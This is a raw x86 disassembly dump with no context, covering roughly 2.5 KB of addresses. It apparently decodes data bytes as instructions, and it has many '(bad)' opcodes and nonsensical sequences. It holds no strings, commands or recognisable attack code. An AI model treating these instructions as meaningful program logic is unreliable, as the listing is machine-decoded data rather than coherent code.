  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 75 1d             	add    %esi,0x1d(%ebp)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 e3                	add    %bl,%ah
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	35 0f 0e 00 89       	xor    $0x89000e0f,%eax
  406f8d:	02 ff                	add    %bh,%bh
  406f8f:	14 0e                	adc    $0xe,%al
  406f91:	00 89 02 fd 06 6b    	add    %cl,0x6b06fd02(%ecx)
  406f97:	01 b1 02 e7 06 47    	add    %esi,0x4706e702(%ecx)
  406f9d:	02 a1 02 e2 10 c7    	add    -0x38ef1dfe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 bb 18 1a 05 89    	add    %edi,-0x76fae5e8(%ebx)
  406fab:	02 83 18 6b 01 89    	add    -0x76fe94e8(%ebx),%al
  406fb1:	02 c4                	add    %ah,%al
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 12 1c    	and    %al,0x1c120289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 91 1b 27    	add    0x271b9102(%ecx),%al
  406fc1:	05 c1 02 5c 14       	add    $0x145c02c1,%eax
  406fc6:	30 05 c9 02 77 08    	xor    %al,0x87702c9
  406fcc:	c7 00 91 02 b9 1c    	movl   $0x1cb90291,(%eax)
  406fd2:	35 05 c1 01 bb       	xor    $0xbb01c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 bd 0a       	add    $0xabd0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 a4 18       	add    $0x18a402d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	d7                   	xlat   %ds:(%ebx)
  406fe9:	08 3e                	or     %bh,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 ff                	add    %bh,%bh
  406fef:	14 4c                	adc    $0x4c,%al
  406ff1:	05 d9 02 66 16       	add    $0x166602d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 0a 07 c3       	mov    0xc3070a02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 bb 18 01 05 99    	add    %edi,-0x66fafee8(%ebx)
  407005:	02 ff                	add    %bh,%bh
  407007:	14 6b                	adc    $0x6b,%al
  407009:	01 f1                	add    %esi,%ecx
  40700b:	02 d7                	add    %bh,%dl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 59 0d             	add    0xd(%ecx),%bl
  407014:	c3                   	ret
  407015:	00 a1 02 1a 07 c7    	add    %ah,-0x38f8e5fe(%ecx)
  40701b:	00 89 02 03 0d 4b    	add    %cl,0x4b0d0302(%ecx)
  407021:	02 89 02 76 0a 4b    	add    0x4b0a7602(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	9f                   	lahf
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	49                   	dec    %ecx
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	62 1b                	bound  %ebx,(%ebx)
  407038:	c7 00 f9 02 ff 14    	movl   $0x14ff02f9,(%eax)
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 06                	add    (%esi),%al
  407043:	0b 23                	or     (%ebx),%esp
  407045:	02 01                	add    (%ecx),%al
  407047:	03 ff                	add    %edi,%edi
  407049:	14 0e                	adc    $0xe,%al
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 4c 07 47          	add    0x47(%edi,%eax,1),%ecx
  407051:	02 c1                	add    %cl,%al
  407053:	01 93 14 47 02 c1    	add    %edx,-0x3efdb8ec(%ebx)
  407059:	01 bd 17 42 02 09    	add    %edi,0x9024217(%ebp)
  40705f:	03 ff                	add    %edi,%edi
  407061:	14 6b                	adc    $0x6b,%al
  407063:	01 09                	add    %ecx,(%ecx)
  407065:	03 58 19             	add    0x19(%eax),%ebx
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	e7 14                	out    %eax,$0x14
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	e8 1a 76 05 21       	call   0x2145e691
  407077:	03 cf                	add    %edi,%ecx
  407079:	0f 7c                	(bad)
  40707b:	05 c1 01 04 1a       	add    $0x1a0401c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 d4                	add    %esp,%edx
  407085:	1b bf 01 81 02 cd    	sbb    -0x32fd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	49                   	dec    %ecx
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7a 07             	add    %edi,0x7(%edx)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	3c 07                	cmp    $0x7,%al
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	fe                   	(bad)
  4070a9:	10 93 05 c1 01 bb    	adc    %dl,-0x44fe3efb(%ebx)
  4070af:	18 99 05 49 03 ff    	sbb    %bl,-0xfcb6fb(%ecx)
  4070b5:	14 0e                	adc    $0xe,%al
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	57                   	push   %edi
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	17                   	pop    %ss
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	ff 14 0e             	call   *(%esi,%ecx,1)
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 64 0c 70          	add    0x70(%esp,%ecx,1),%ah
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	ce                   	into
  4070d3:	04 aa                	add    $0xaa,%al
  4070d5:	05 c1 01 c8 0c       	add    $0xcc801c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 41             	roll   $0x41,(%ecx)
  4070df:	14 47                	adc    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e7                	add    %esp,%edi
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 d8 0f       	add    $0xfd80159,%eax
  4070ec:	1d 00 61 03 64       	sbb    $0x64036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	46                   	inc    %esi
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b5 07                	mov    $0x7,%ch
  4070fe:	c3                   	ret
  4070ff:	05 59 03 c7 07       	add    $0x7c70359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 64 0c       	add    $0xc640359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	f4                   	hlt
  40710f:	1a c9                	sbb    %cl,%cl
  407111:	05 79 03 ff 14       	add    $0x14ff0379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 76 06       	add    $0x6760379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 63 08       	add    $0x86300c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 63 08             	add    %ah,0x8(%ebx)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 ff                	add    %edi,%edi
  40712d:	14 36                	adc    $0x36,%al
  40712f:	02 0c 00             	add    (%eax,%eax,1),%cl
  407132:	ff 14 0e             	call   *(%esi,%ecx,1)
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	27                   	daa
  407139:	03 f5                	add    %ebp,%esi
  40713b:	05 0c 00 3f 1b       	add    $0x1b3f000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	70 1c                	jo     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 dd 10       	add    $0x10dd01c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 ec                	add    %ch,%ah
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f9                	add    %bh,%cl
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 70 03             	add    %dh,0x3(%eax)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	69 1d 1d 06 69 00 ff 	imul   $0x30114ff,0x69061d,%ebx
  407169:	14 01 03 
  40716c:	61                   	popa
  40716d:	00 ff                	add    %bh,%bh
  40716f:	14 2d                	adc    $0x2d,%al
  407171:	06                   	push   %es
  407172:	91                   	xchg   %eax,%ecx
  407173:	03 63 08             	add    0x8(%ebx),%esp
  407176:	0e                   	push   %cs
  407177:	00 99 03 ff 14 56    	add    %bl,0x5614ff03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 b3 0b 35 06 81    	add    -0x7ef9caf5(%ebx),%esi
  407185:	02 1c 05 0a 00 91 02 	add    0x291000a(,%eax,1),%bl
  40718c:	9f                   	lahf
  40718d:	1c 35                	sbb    $0x35,%al
  40718f:	05 91 02 bd 0a       	add    $0xabd0291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	7e 05                	jle    0x40719f
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 9f 1c 54    	add    0x541c9f02(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b4 0a 7c 05 91 02 	add    0x291057c(%edx,%ecx,1),%dh
  4071aa:	9d                   	popf
  4071ab:	0a 6b 01             	or     0x1(%ebx),%ch
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 b9 1c 5e 06 91    	add    -0x6ef9a1e4(%ecx),%bh
  4071b5:	02 6d 05             	add    0x5(%ebp),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 27                	add    %ah,(%edi)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 a8 1b       	add    $0x1ba803b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	e7 14                	out    %eax,$0x14
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	e8 1a a4 06 1c       	call   0x1c4715ed
  4071d3:	00 e8                	add    %ch,%al
  4071d5:	0a a9 06 24 00 d4    	or     -0x2bffdbfa(%ecx),%ch
  4071db:	1b bf 01 c9 03 ba    	sbb    -0x45fc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 1d    	adc    %dh,0x1d03c906(%ebx)
  4071e7:	03 b9 06 d1 03 2a    	add    0x2a03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	ef                   	out    %eax,(%dx)
  4071f3:	04 c8                	add    $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	0d 06 cf 06 f1       	or     $0xf106cf06,%eax
  4071fd:	03 b8 08 d8 06 01    	add    0x106d808(%eax),%edi
  407203:	04 cf                	add    $0xcf,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	b8 08 17 07 2c       	mov    $0x2c071708,%eax
  40720f:	00 6b 19             	add    %ch,0x19(%ebx)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	9a 05 3b 07 1c 00 ff 	lcall  $0xff00,$0x1c073b05
  40721d:	14 0e                	adc    $0xe,%al
  40721f:	00 c1                	add    %al,%cl
  407221:	01 a7 1d 84 00 21    	add    %esp,0x2100841d(%edi)
  407227:	04 ff                	add    $0xff,%al
  407229:	14 6b                	adc    $0x6b,%al
  40722b:	01 19                	add    %ebx,(%ecx)
  40722d:	04 ff                	add    $0xff,%al
  40722f:	14 59                	adc    $0x59,%al
  407231:	07                   	pop    %es
  407232:	29 04 b3             	sub    %eax,(%ebx,%esi,4)
  407235:	16                   	push   %ss
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 2f                	add    %ebp,(%edi)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	ff 14 6b             	call   *(%ebx,%ebp,2)
  407243:	01 59 02             	add    %ebx,0x2(%ecx)
  407246:	ff 14 0e             	call   *(%esi,%ecx,1)
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 ff                	add    $0xff,%al
  40724d:	14 0e                	adc    $0xe,%al
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	5b                   	pop    %ebx
  407253:	0b 01                	or     (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	f8                   	clc
  407259:	0a 01                	or     (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	fe 04 7a             	incb   (%edx,%edi,2)
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 a7                	add    $0xa7,%al
  407265:	0b 81 07 51 04 97    	or     -0x68fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	91                   	xchg   %eax,%ecx
  407271:	02 0e                	add    (%esi),%cl
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	24 15                	and    $0x15,%al
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 ff             	cmp    %eax,(%edi,%edi,8)
  40727d:	14 8e                	adc    $0x8e,%al
  40727f:	07                   	pop    %es
  407280:	51                   	push   %ecx
  407281:	04 83                	add    $0x83,%al
  407283:	02 31                	add    (%ecx),%dh
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 4a                	add    $0x4a,%al
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	ff 14 2b             	call   *(%ebx,%ebp,1)
  407291:	02 59 02             	add    0x2(%ecx),%bl
  407294:	70 1c                	jo     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 17                	add    (%edi),%edx
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	ff 14 6b             	call   *(%ebx,%ebp,2)
  4072a3:	01 51 04             	add    %edx,0x4(%ecx)
  4072a6:	8a 02                	mov    (%edx),%al
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 14                	add    $0x14,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	7b 0d                	jnp    0x4072c1
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 2a 1d be 07 91 	addl   $0x9107be1d,(%edx,%ebp,1)
  4072bd:	04 53                	add    $0x53,%al
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 ff 14 0e       	mov    0xe14ff04,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 c7                	add    %eax,%edi
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b3 16 99 01 49    	add    0x49019916(%ebx),%dh
  4072d5:	02 b3 16 ab 01 a9    	add    -0x56fe54ea(%ebx),%dh
  4072db:	00 ff                	add    %bh,%bh
  4072dd:	14 0e                	adc    $0xe,%al
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	cf                   	iret
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	3f                   	aas
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	c4 12                	les    (%edx),%edx
  4072f0:	0e                   	push   %cs
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 70 17             	add    %esi,0x17(%eax)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 93 0a 28 08 49    	add    %dl,0x4908280a(%ebx)
  4072ff:	02 b3 16 a5 01 51    	add    0x5101a516(%ebx),%dh
  407305:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  40730b:	01 39                	add    %edi,(%ecx)
  40730d:	10 47 02             	adc    %al,0x2(%edi)
  407310:	a9 04 71 08 37       	test   $0x37087104,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 71 08             	add    0x8(%ecx),%esi
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 b9 05 68 08 b1    	add    %edi,-0x4ef797fb(%ecx)
  40734d:	04 71                	add    $0x71,%al
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 b3 16 7a 08 59    	add    0x59087a16(%ebx),%dh
  407359:	03 40 1d             	add    0x1d(%eax),%eax
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	ff 14 88             	call   *(%eax,%ecx,4)
  407363:	08 c1                	or     %al,%cl
  407365:	00 8a 0a f4 01 89    	add    %cl,-0x76fe0bf6(%edx)
  40736b:	01 ff                	add    %edi,%edi
  40736d:	14 6b                	adc    $0x6b,%al
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 36                	add    (%esi),%dh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 b9       	mov    $0xb9024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	b3 16                	mov    $0x16,%bl
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 ff             	roll   $1,(%edi,%edi,8)
  4073a3:	14 28                	adc    $0x28,%al
  4073a5:	09 09                	or     %ecx,(%ecx)
  4073a7:	00 80 00 0d 01 09    	add    %al,0x9010d00(%eax)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 5e 1a             	add    %bl,0x1a(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 42 1a             	add    %al,0x1a(%edx)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 9b 13 a9 00 00    	add    %bl,0xa913(%ebx)
  4075cd:	00 27                	add    %ah,(%edi)
  4075cf:	0b ae 00 00 00 d8    	or     -0x28000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 de    	sbb    %ebp,-0x22000000(%esi)
  4075db:	0a b2 00 00 00 5b    	or     0x5b000000(%edx),%dh
  4075e1:	03 b7 00 00 00 fb    	add    -0x5000000(%edi),%esi
  4075e7:	02 bb 00 00 00 91    	add    -0x6f000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 fb    	or     -0x5000000(%edx),%esi
  4075f3:	0e                   	push   %cs
  4075f4:	bf 00 00 00 f6       	mov    $0xf6000000,%edi
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 a2 1a c3 01 00    	add    %ah,0x1c31a(%edx)
  407603:	00 d3                	add    %dl,%bl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	96                   	xchg   %eax,%esi
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	a4                   	movsb  %ds:(%esi),%es:(%edi)
